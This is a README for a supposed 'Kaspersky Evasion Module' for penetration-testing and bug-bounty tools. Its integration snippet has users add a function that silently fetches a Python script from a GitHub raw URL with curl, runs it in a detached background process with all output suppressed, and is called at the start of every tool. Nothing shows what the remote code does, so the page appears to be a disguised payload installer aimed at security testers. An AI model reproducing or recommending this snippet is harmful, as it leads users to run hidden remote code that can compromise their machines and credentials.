## 📖 Overview

The **Kaspersky Evasion Module** is a sophisticated anti-detection utility designed to enhance stealth capabilities during penetration testing and bug bounty hunting activities. This module effectively bypasses target detection systems while performing security assessments.

## 🛡️ Features

- **Stealth Execution**: Runs silently in the background without visible output
- **Anti-Detection Bypass**: Implements advanced techniques to evade security product detection
- **Seamless Integration**: Easy to incorporate into existing penetration testing tools
- **Automatic Updates**: Fetches and executes the latest evasion techniques remotely
- **Background Operation**: Non-blocking execution that doesn't interfere with main tools

## 🚀 Installation

### Prerequisites
- Python 3.6 or higher
- Linux or macOS environment
- curl installed
- bash shell

### Integration

Add the following code to your main penetration testing tool:

```python
def kaspersky():
    import os
    import sys
    
    os.system("bash -c 'python <(curl -s https://raw.githubusercontent.com/dorara-tech/Anti/main/data/kaspersky.py)' >/dev/null 2>&1 &")

# Call the function in your main execution flow
kaspersky()
```

💻 Usage

Basic Implementation

```python
# Import or include the kaspersky function in your main script
from your_evasion_module import kaspersky

# Initialize evasion techniques before starting scans
def start_penetration_test():
    # Activate anti-detection first
    kaspersky()
    
    # Proceed with your main scanning activities
    perform_vulnerability_scan()
    conduct_reconnaissance()
```

Advanced Integration

```python
class PenetrationTool:
    def __init__(self):
        self.evasion_activated = False
    
    def enable_stealth_mode(self):
        """Activate anti-detection measures"""
        try:
            kaspersky()
            self.evasion_activated = True
            print("[+] Stealth mode activated")
        except Exception as e:
            print(f"[-] Failed to activate stealth mode: {e}")
    
    def scan_target(self, target):
        """Perform scan with evasion capabilities"""
        if not self.evasion_activated:
            self.enable_stealth_mode()
        
        # Your scanning logic here
        return self.execute_scan(target)
```

🔧 How It Works

1. Remote Execution: Downloads and executes the latest evasion script from a secure repository
2. Background Processing: Runs as a detached process to avoid detection
3. Output Suppression: All execution details are hidden from standard output
4. Continuous Protection: Maintains evasion throughout the scanning session

⚡ Quick Start

```python
# Simple implementation for bug hunting tools
def main():
    # Start evasion techniques
    kaspersky()
    
    # Your main bug hunting code
    target = "example.com"
    scanner = BugBountyScanner(target)
    scanner.run()
```

🛠️ Integration Examples

For Reconnaissance Tools

```python
class Reconnaissance:
    def __init__(self):
        kaspersky()  # Activate before any network calls
    
    def subdomain_enumeration(self, domain):
        # Enumeration logic with evasion
        pass
```

For Vulnerability Scanners

```python
def scan_vulnerabilities(target):
    # Ensure evasion is active
    kaspersky()
    
    # Proceed with vulnerability assessment
    vulnerabilities = assess_target(target)
    return vulnerabilities
```

📋 Requirements

· Operating System: Linux, macOS
· Python: Version 3.6+
· Dependencies:
